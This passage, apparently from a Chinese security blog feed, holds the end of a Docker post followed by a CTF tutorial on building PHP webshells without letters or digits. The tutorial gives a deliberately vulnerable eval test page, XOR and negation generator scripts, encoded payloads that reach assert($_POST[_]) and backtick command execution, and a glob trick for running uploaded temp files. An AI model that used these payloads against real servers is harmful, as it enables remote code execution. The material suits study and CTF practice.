class="line">  which-<span class="number">2.21</span>-<span class="number">12</span>.el8.x86_64             </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container f119b2fc3459</span><br><span class="line"> ---&gt; <span class="number">492</span>b0e9bfd9f</span><br><span class="line">Step <span class="number">6</span>/<span class="number">8</span> : <span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"> ---&gt; Running in ea437f060be5</span><br><span class="line">Removing intermediate container ea437f060be5</span><br><span class="line"> ---&gt; <span class="number">7</span>b1ffe6341bf</span><br><span class="line">Step <span class="number">7</span>/<span class="number">8</span> : <span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">2</span>a3e3fb9e634</span><br><span class="line">Removing intermediate container <span class="number">2</span>a3e3fb9e634</span><br><span class="line"> ---&gt; cadb8d02b5fc</span><br><span class="line">Step <span class="number">8</span>/<span class="number">8</span> : <span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"> ---&gt; Running in <span class="number">485</span>a50d91473</span><br><span class="line">Removing intermediate container <span class="number">485</span>a50d91473</span><br><span class="line"> ---&gt; d7dde5695515</span><br><span class="line">Successfully built d7dde5695515</span><br><span class="line">Successfully tagged mycentos:<span class="number">0.1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/4.png" alt="11"></p><h3 id="Docker文件存储"><a href="#Docker文件存储" class="headerlink" title="Docker文件存储"></a>Docker文件存储</h3><p>docker文件存储格式，linux的一个存储技术，叫做联合文件系统，是一种分层的文件系统，可以将不同的目录挂到同一个虚拟文件系统下。</p><p>比如test1下有三个文件夹,test2下有两个文件夹,还有一个readme文件.联合文件系统就是可以在一个文件夹(test)中看到多个文件夹(test1,test2)中的内容.</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/5.png"></p><p>docker镜像系统的每一层都是只读的,然后把每一层加载完成之后这些文件都会被看成是同一个目录,相当于只有一个文件系统.docker的这种文件系统被称之为镜像.</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/6.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Docker的思想&quot;&gt;&lt;a href=&quot;#Docker的思想&quot; class=&quot;headerlink&quot; title=&quot;Docker的思想&quot;&gt;&lt;/a&gt;Docker的思想&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://zhuang-yongyi.gitee.io/y</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>浅析CTF绕过字符数字构造shell</title>
    <link href="http://www.yoyo2tong.xyz/2020/12/21/%E6%B5%85%E6%9E%90CTF%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell/"/>
    <id>http://www.yoyo2tong.xyz/2020/12/21/%E6%B5%85%E6%9E%90CTF%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell/</id>
    <published>2020-12-21T14:54:11.125Z</published>
    <updated>2021-03-25T15:30:48.585Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为CTF中，虽然有很多文章有这方面的资料，但是相对来说比较零散，这里主要把自己学习和打ctf遇到的一些绕过字符数字构造shell梳理一下。</p><p>无字母数字webshell简单来说就是payload中不能出现字母，数字（有些题目还有其他一些过滤），通过异或取反等方法取得flag。</p><h3 id="测试源码"><a href="#测试源码" class="headerlink" title="测试源码"></a>测试源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果shell中不还有字母和数字，则可以执行eval语句</span></span><br></pre></td></tr></table></figure><h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>异或的符号是<code>^</code>,是一种运算符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure><h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行该脚本我们知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%81^%FF&#x3D;&gt;~     %82^%FF&#x3D;&gt;&#125;       %83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;     %85^%FF&#x3D;&gt;z       %86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x     %88^%FF&#x3D;&gt;w       %89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u     %8B^%FF&#x3D;&gt;t       %8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r     %8E^%FF&#x3D;&gt;q       %8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o     %91^%FF&#x3D;&gt;n       %92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l     %94^%FF&#x3D;&gt;k       %95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i     %97^%FF&#x3D;&gt;h       %98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f     %9A^%FF&#x3D;&gt;e       %9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c     %9D^%FF&#x3D;&gt;b       %9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;     %A0^%FF&#x3D;&gt;_       %A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]     %A3^%FF&#x3D;&gt;\       %A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z     %A6^%FF&#x3D;&gt;Y       %A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W     %A9^%FF&#x3D;&gt;V       %AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T     %AC^%FF&#x3D;&gt;S       %AD^%FF&#x3D;&gt;R    </span><br><span class="line">%AE^%FF&#x3D;&gt;Q     %AF^%FF&#x3D;&gt;P       %B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N     %B2^%FF&#x3D;&gt;M       %B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K     %B5^%FF&#x3D;&gt;J       %B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H     %B8^%FF&#x3D;&gt;G       %B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E     %BB^%FF&#x3D;&gt;D       %BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B     %BE^%FF&#x3D;&gt;A       %BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br></pre></td></tr></table></figure><p>通过这种方法构造一个phpinfo()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br><span class="line">我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。 %A0^%FF=&gt;_ </span><br><span class="line">%B8^%FF=&gt;G</span><br><span class="line">%BA^%FF=&gt;E  </span><br><span class="line">%AB^%FF=&gt;T </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/1.png"></p><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p><p>直接看如何构造phpinfo()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/2.png" alt="取反"></p><p>可以看出，自己对phpinfo取反，会产生一些不可见字符，可对phpinfo取反后再进行url编码。</p><h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/3.png" alt="取反1"></p><h3 id="构造assert字符"><a href="#构造assert字符" class="headerlink" title="构造assert字符"></a>构造assert字符</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span>E^%FF=&gt;a</span><br><span class="line"> %<span class="number">8</span>C^%FF=&gt;s</span><br><span class="line"> %<span class="number">9</span>A^%FF=&gt;e</span><br><span class="line"> %<span class="number">8</span>D^%FF=&gt;r</span><br><span class="line"> %<span class="number">8</span>B^%FF=&gt;t</span><br><span class="line"> </span><br><span class="line">  %A0^%FF=&gt;_    </span><br><span class="line"> %AF^%FF=&gt;P </span><br><span class="line"> %B0^%FF=&gt;O</span><br><span class="line"> %AC^%FF=&gt;S</span><br><span class="line"> %AB^%FF=&gt;T </span><br><span class="line">    </span><br><span class="line">$_=<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$__=<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/4.png" alt="取反2"></p><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p><strong>脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$result1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$result2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($num=<span class="number">0</span>;$num&lt;=strlen($shell);$num++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($x=<span class="number">33</span>;$x&lt;<span class="number">126</span>;$x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>($y=<span class="number">33</span>;$y&lt;=<span class="number">126</span>;$y++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f = chr($x)^chr($y);</span><br><span class="line">                    <span class="keyword">if</span>($f == $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .= chr($x);</span><br><span class="line">                        $result2 .= chr($y);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $result1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $result2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">$c</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个脚本可以将“assert”变成两个字符串异或的结果，通过更改shell的值可以构造出我们想要的字符串。为了便于表示，生成字符串的范围为33-126（可见字符）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//构造出assert</span></span><br><span class="line">$__ = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//构造出_POST</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___ = $_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell&#x3D;%24_+%3d+%22!((%25)(%22^%22%40[[%40[\\%22%3b%24__+%3d+%22!%2b%2f((%22^%22~&#123;&#96;&#123;|%22%3b%24___+%3d+%24%24__%3b%24_(%24___[_])%3b</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/5.png" alt="异或2"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_ &#x3D; &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;</span><br><span class="line">$__ &#x3D; &quot;!+&#x2F;((&quot;^&quot;~&#123;&#96;&#123;|&quot;;  </span><br><span class="line">$___ &#x3D; $$__; </span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%5f%3d%22%21%28%28%25%29%28%22%5e%22%40%5b%5b%40%5b%5c%5c%22%3b%24%5f%5f%3d%22%21%2b%2f%28%28%22%5e%22%7e%7b%60%7b%7c%22%3b%24%5f%5f%5f%3d%24%24%5f%5f%3b%24%5f%28%24%5f%5f%5f%5b%5f%5d%29%3b</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/7.png" alt="异或6"></p><h4 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"></span><br><span class="line">$b = urlencode(~<span class="string">&#x27;_POST&#x27;</span>);</span><br><span class="line"><span class="comment">//%A0%AF%B0%AC%AB</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line">$__ = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___=$_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=$_=~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;$__=~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/8.png" alt="取反3"></p><h3 id="PHP5和7的区别"><a href="#PHP5和7的区别" class="headerlink" title="PHP5和7的区别"></a>PHP5和7的区别</h3><ul><li><p>PHP5中，assert()是一个函数，我们可以用$<em>=assert;$</em>()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的语言结构，不再支持上面那种调用方法。但PHP7.0.12下还能这样调用。                  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/9.png" alt="13"></p></li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP  7.0.12</span><br></pre></td></tr></table></figure><p>  <img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/10.png" alt="14"></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP7</span><br></pre></td></tr></table></figure><p>  <img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/11.png" alt="15"></p><ul><li><p>PHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 5</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/12.png" alt="12"></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 7</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/13.png" alt="11"></p><h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了_</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析下这个Payload，?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~”%a0%b8%ba%ab”为”_GET”，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/14.png" alt="get"></p><h3 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了$"></a>过滤了$</h3><h4 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h4><p>在PHP7中，我们可以使用($a)()这种方法来执行命令。所以可以用取反构造payload执行命令。(~%8F%97%8F%96%91%99%90)();执行phpinfo函数，第一个括号中可以是任意的表达式。但是这里不能用assert()来执行函数，因为php7不支持assert()函数。</p><h4 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h4><p>在PHP5中不再支持($a)()方法来调用函数，在膜拜P神的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇</a>后，有了新的启发。如何在无字母，数字，$的系统命令下getshell？我们利用在Linux shell下两个知识点</p><p>1，shell下可以利用<code>.</code>来执行任意脚本</p><p>2，Linux文件名支持glob通配符代替</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/15.png" alt="16"></p><p>从图可以看出，我们可以成功用<code>.</code>+文件名来执行文件，但是当使用通配符来执行文件时，系统会执行匹配到的第一个文件。</p><p>在这两个条件下我们可以想到，如果我们可以上传一个文件，用<code>.</code>来执行这个文件就可以成功getshell。</p><p>那么我们怎么上传文件呢？上传文件成功后文件又保存在哪里？怎么匹配执行？</p><p>首先我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>,文件名最后6个字符是随机的大小写字母。</p><p>现在我们可以利用glob通配符匹配该文件，我们知道</p><p><code>*</code>可以代替0个及以上任意文件</p><p><code>?</code>可以代表1个任意字符</p><p><code>[^a]</code>可以用来判断这个位置的字符是不是a</p><p><code>[0-9]</code>可以用来限制范围</p><p>通过ascii码表我们知道，可见大写字母<code>@</code>与<code>[</code>之间，所以我们可以利用<code>[@-[]</code>来表示大写字母。</p><p>综上，我们可以利用<code>. /???/????????[@-[]</code>来匹配<code>/tmp/phpXXXXXX</code></p><h4 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;evil&#x27;</span>])&gt;<span class="number">25</span>||preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, $_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;danger!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过编写脚本看看哪些可见字符没有被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, chr($ascii))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (chr($ascii));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/16.png" alt="17"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以发现过滤了字母，数字，&#96;$&#96;，&#96;_&#96;，&#96;()&#96;等，但&#96;和  .  还没有被过滤。由于过滤了（）所以不论PHP版本是5或者7，都不能执行($a)()，所以就没有必要去判断PHP版本。由此可以想到上传一个小马文件，然后用 &#96;  来执行文件。</span><br></pre></td></tr></table></figure><p>首先，我们应该上传写一个表单上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 